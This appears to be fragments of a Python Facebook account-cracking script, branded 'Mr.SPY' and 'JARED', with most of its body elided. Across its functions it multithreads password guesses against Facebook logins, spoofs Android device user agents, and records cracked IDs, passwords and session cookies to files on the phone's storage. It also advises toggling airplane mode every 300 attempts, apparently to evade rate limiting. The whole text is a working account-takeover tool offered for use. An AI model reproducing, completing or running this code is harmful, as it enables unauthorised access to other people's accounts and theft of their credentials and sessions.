...
["USE AIRPLANE MODE EVERY 300COUNTS"']
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;33m[Mr.SPY-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(50*'_')
                print(f"\r\033[1;33m[Mr.SPY-OK] {cid}|{ps} \nCookie : {coki}")
                #print(f' Useragent : {pro}')
                open('/sdcard/JARED-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\033[1;33m[Mr.SPY-CP] {cid}|{ps}")
                #print(f' Useragent : {pro}')
                open('/sdcard/JARED-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[JARED-DONE] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/JARED-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\r\r\x1b[1;36m [JARED-LOCK] ' +cid+ ' • ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\033[1;33m [JARED-V1-RNDM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def api(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\033[1;33m [JARED.-API-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			fbca = device['fbca']
			fbdm = device['fbdm']
			ua = "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4718.119 Mobile Safari/537.36 VivoBrowser/7.3.8.3"
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [JARED-DONE] '+str(ids)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/JARED-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [JARED-LOGE] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/JARED-CP.txt','a').write(str(ids)+'|'+pas+'\n')
				break
			else:
				continue
		loop+=1
...
def file2():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;37m USE FLIGHT MODE EVERY 300 COUNTS \033[1;37m")
			linex()
			for user in fo:
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\033[1;33m [JARED-VIP-FILE] %s|\r\033[1;33mOK:-%s \r\033[1;33m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [JARED-DONE] %s | %s'%(ids,pas))
                                print('\r\r\033[1;32m [COOKIES] %s   '%(cookie))
                                open(f'/sdcard/JARED-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\033[1;33m [JARED-LOCK] %s | %s'%(ids,pas))
